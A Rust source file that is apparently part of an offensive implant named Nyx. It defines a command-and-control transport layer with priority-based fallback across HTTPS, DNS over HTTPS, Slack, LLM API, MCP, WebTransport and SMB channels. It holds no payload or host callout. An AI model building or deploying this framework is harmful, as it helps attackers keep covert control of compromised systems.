// Nyx Transport Abstraction Layer — pluggable C2 channel framework.
//
// Channel priorities (0 = highest): HTTPS > DoH DNS > Slack API > LLM API > MCP > WebTransport > SMB

// ---- Error type -----------------------------------------------------------

#[derive(Debug)]
pub enum TransportError {
    /// Channel is dead — no recovery possible.
    Dead(&'static str),
    /// Transient failure — retry may succeed.
    Transient(&'static str),
    /// Timeout waiting for response.
    Timeout,
    /// Payload too large for this channel.
    PayloadTooLarge(usize),
}

// ---- Transport trait ------------------------------------------------------

/// Pluggable C2 transport channel.
///
/// Each implementation handles a specific protocol (HTTPS, DNS, Slack API, etc.).
/// The `TransportStack` manages priority-based auto-fallback.
pub trait Transport {
    /// Send a frame. Returns Ok(()) if delivered, Err on failure.
    fn send(&mut self, frame: &[u8]) -> Result<(), TransportError>;

    /// Receive next frame. Blocks up to `timeout_ms`.
    fn recv(&mut self, timeout_ms: u32) -> Result<Vec<u8>, TransportError>;

    /// Check channel health. Returns latency in ms, or None if dead.
    fn health_check(&self) -> Option<u64>;

    /// Channel identifier for logging.
    fn name(&self) -> &'static str;

    /// Maximum payload size this channel supports in a single frame.
    fn max_frame_size(&self) -> usize {
        1024 * 1024
    } // default 1MB

    /// Whether this channel requires connectivity check before use.
    fn requires_probe(&self) -> bool {
        true
    }

    /// One-time initialization (called once when channel is first activated).
    fn init(&mut self) -> Result<(), TransportError> {
        Ok(())
    }
}

// ---- TransportStack -------------------------------------------------------

struct ChannelSlot {
    transport: Box<dyn Transport>,
    priority: u8,
    healthy: bool,
    fail_count: u8,
    last_latency_ms: u64,
}

/// Priority-based multi-channel transport with auto-fallback.
pub struct TransportStack {
    channels: Vec<ChannelSlot>,
    active: usize,
    max_consecutive_fails: u8,
    /// Cadence (ms) for background health probes. Stored for the health
    /// monitor task (not yet wired); read once the probe loop is added.
    #[allow(dead_code)]
    health_probe_interval_ms: u64,
}

impl TransportStack {
    /// Create a new transport stack. Channels are tried in priority order.
    pub fn new(max_fails: u8, probe_ms: u64) -> Self {
        TransportStack {
            channels: Vec::new(),
            active: 0,
            max_consecutive_fails: max_fails,
            health_probe_interval_ms: probe_ms,
        }
    }

    /// Register a channel with given priority (lower = preferred).
    pub fn register(&mut self, transport: Box<dyn Transport>, priority: u8) {
        let name = transport.name();
        self.channels.push(ChannelSlot {
            transport,
            priority,
            healthy: false,
            fail_count: 0,
            last_latency_ms: 0,
        });
        // Keep channels sorted by priority
        self.channels.sort_by_key(|c| c.priority);
        // Log: registered channel
        let _ = name;
    }

    /// Initialize all registered channels.
    pub fn init_all(&mut self) {
        for slot in &mut self.channels {
            if let Err(_e) = slot.transport.init() {
                slot.healthy = false;
            }
        }
    }

    /// Send frame on current active channel. On failure, try next.
    pub fn send(&mut self, frame: &[u8]) -> Result<(), TransportError> {
        // Try active channel first
        if self.active < self.channels.len() {
            let slot = &mut self.channels[self.active];
            match slot.transport.send(frame) {
                Ok(()) => {
                    slot.fail_count = 0;
                    slot.healthy = true;
                    return Ok(());
                }
                Err(TransportError::Transient(_)) => {
                    slot.fail_count += 1;
                    if slot.fail_count >= self.max_consecutive_fails {
                        slot.healthy = false;
                    }
                }
                Err(_) => {
                    slot.healthy = false;
                }
            }
        }

        // Fallback: try all channels in priority order
        for (i, slot) in self.channels.iter_mut().enumerate() {
            if i == self.active {
                continue;
            } // already tried
            if !slot.transport.requires_probe() || slot.healthy {
                match slot.transport.send(frame) {
                    Ok(()) => {
                        self.active = i;
                        slot.fail_count = 0;
                        slot.healthy = true;
                        return Ok(());
                    }
                    Err(TransportError::Transient(_)) => {
                        slot.fail_count += 1;
                    }
                    Err(_) => {
                        slot.healthy = false;
                    }
                }
            }
        }

        Err(TransportError::Dead("all channels exhausted"))
    }

    /// Receive next frame from active channel.
    pub fn recv(&mut self, timeout_ms: u32) -> Result<Vec<u8>, TransportError> {
        if self.active < self.channels.len() {
            self.channels[self.active].transport.recv(timeout_ms)
        } else {
            Err(TransportError::Dead("no active channel"))
        }
    }

    pub fn probe_health(&mut self) {
        let mut needs_switch = false;
        for (i, slot) in self.channels.iter_mut().enumerate() {
            match slot.transport.health_check() {
                Some(lat) => {
                    slot.healthy = true;
                    slot.last_latency_ms = lat;
                    slot.fail_count = 0;
                }
                None => {
                    slot.fail_count += 1;
                    if slot.fail_count >= self.max_consecutive_fails {
                        slot.healthy = false;
                        if i == self.active {
                            needs_switch = true;
                        }
                    }
                }
            }
        }
        // Switch active channel AFTER the mutable loop ends
        if needs_switch {
            if let Some(next) = self.channels.iter().position(|c| c.healthy) {
                self.active = next;
            }
        }
    }

    /// Get active channel name for logging.
    pub fn active_name(&self) -> &'static str {
        if self.active < self.channels.len() {
            self.channels[self.active].transport.name()
        } else {
            "none"
        }
    }

    /// How many channels are currently healthy.
    pub fn healthy_count(&self) -> usize {
        self.channels.iter().filter(|c| c.healthy).count()
    }
}
